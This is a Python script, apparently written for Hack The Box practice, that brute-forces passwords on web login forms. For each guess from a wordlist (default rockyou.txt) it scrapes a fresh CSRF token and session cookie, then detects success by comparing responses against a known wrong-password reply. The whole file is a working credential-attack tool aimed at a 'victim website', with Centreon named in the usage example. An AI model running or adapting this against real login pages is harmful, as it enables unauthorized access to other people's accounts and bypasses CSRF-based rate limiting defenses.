#!/usr/bin/env python3

import requests
import re
from termcolor import colored
import argparse


# Author: J3wker
# HTB Profile: https://www.hackthebox.eu/home/users/profile/165824
# GitHub: https://github.com/J3wker/PToolity
x = """
      __         ___  _____          _                   __  
     / /        |_  ||____ |        | |                  \ \ 
    / /_____      | |    / /_      _| | _____ _ __   _____\ \ 
   < <______|     | |    \ \ \ /\ / / |/ / _ \ '__| |______> > 
    \ \       /\__/ /.___/ /\ V  V /|   <  __/ |          / /     
     \_\      \____/ \____/  \_/\_/ |_|\_\___|_|         /_/                                                                                       
   """
def creds():
    print(x)
    print(colored("Bruteforce CSRF", 'blue'))
    print(colored("---------------------\n", 'green'))
    print(colored("Author: J3wker", 'red'))
    print(colored("HTB Profile: https://www.hackthebox.eu/profile/165824", 'green'))
    print(colored("GitHub: https://github.com/J3wker\n\n", 'green'))

def parse():
    parser = argparse.ArgumentParser(description='[+] Usage: ./brutecsrf.py --url http://test.com  --csrf centreon_token --u admin \n | NOTE: If a field dont have a name - set them as "" ')
    parser.add_argument('--url', dest="target_url", help='Victim Website')
    parser.add_argument('--csrf', dest="csrf", help=' csrf name in HTTP form')
    parser.add_argument('--u', "--user", dest="username", help=' username you are brute forcing')
    parser.add_argument('--lu', "--fuser", dest="usr", help=' username field name in HTML form')
    parser.add_argument('--p', "--passwd", dest="passwd", help=' password field name in HTML form')
    parser.add_argument('--s', "--sub", dest="sub", help=' submit field name in HTML form')
    parser.add_argument('--w', "--wordlist", dest="wordlist", help=' path to wordlist')

    options = parser.parse_args()

    return options

# Function to the sumbit button
def get_form():
    attack = requests.get(target_url, allow_redirects=False)
    data = attack.content
    data = str(data)
    submit = re.search('(?:<input.* name=")(.*)" (?:value=")(.*)(?:" type="submit".*/>)', data)
    submit_name = submit.group(1)
    submit_value = submit.group(2)

    return [submit_name, submit_value]

# Function to basic data such as a Cookie and CSRF token from the website
def get_data():
   attack = requests.get(target_url, allow_redirects=False)
   data = attack.content
   headers = str(attack.headers["set-cookie"])
   cookie = re.search('(?:PHPSESSID=)(.*)(?:;)', headers)
   cookie = cookie.group(1)

   data = str(data)
   token = re.search(f'(?:<input name="{csrf}" type="hidden" value=")(.*)(?:" />)', data)
   csrft = token.group(1)


   return [str(csrft), str(cookie)]


# Function that gets the response from a wrong password to compare it know when we have the right password
def get_wrong(username):
    forge = get_data()
    data = {
        fuser: username,
        passwdf: "omri",
        csrf: forge[0],
        submit_name: submit_value
    }

    cookie = {
        "PHPSESSID": forge[1]
    }

    response = requests.post(target_url, data=data, cookies=cookie)
    response = (str(response.content))
    response = re.sub(f'(?:"{csrf}" type="hidden" value=")(.*)(?:" />)', "omri", response)


    return response


# Function that does the attack
def url_request(username):
    wrong = get_wrong(username)
    with open(wordlist, "r") as list:
        for line in list:
            forge = get_data()  # creating data for the POST request
            data = {
                fuser: username,
                passwdf: "",
                csrf: forge[0],
                submit_name: submit_value
            }

            cookie = {
                "PHPSESSID": forge[1]
            }

            word = line.strip()
            print("Trying : " + word, end="\r")
            data[passwdf] = word
            response = requests.post(target_url, data=data, cookies=cookie)
            response = (str(response.content))
            response = response.replace(f'value="{word}"', 'value="omri"')  # Replacing the password field with the word 'omri' so we can compare it to wrong response
            response = re.sub(f'(?:"{csrf}" type="hidden" value=")(.*)(?:" />)', "omri", response)  # Replacing the CSRF token with 'omri' so we can comapre it to the wrong response

            if response != wrong:
                print("Trying : " + word)
                print("correct password is : " + colored(word, "green"))
                exit()

        print("[-] Reached end of line.")


# a bit of a mess but we needed this way instead of making a main function the returns all of that
# we have a lot of data being processed so thats my only way to make the program quick and easy and save lines
# nevertheless it works fine so we're good happy hackers.
try:
    options = parse()

    target_url = options.target_url

    csrf = options.csrf
    user = options.username
    passwdf = options.passwd
    fuser = options.usr
    form = get_form()
    submit_name = form[0]
    submit_value = form[1]
    wordlist = options.wordlist

    if wordlist == None:
        wordlist = "/root/rockyou.txt"

    if passwdf == None:
        passwdf = "password"
    if fuser == None:
        fuser = "username"

    creds()

    # program actual run time
    url_request(user)

except Exception:
    print(colored("[-] Something went wrong - check wordlist path OR request timed out", "red"))



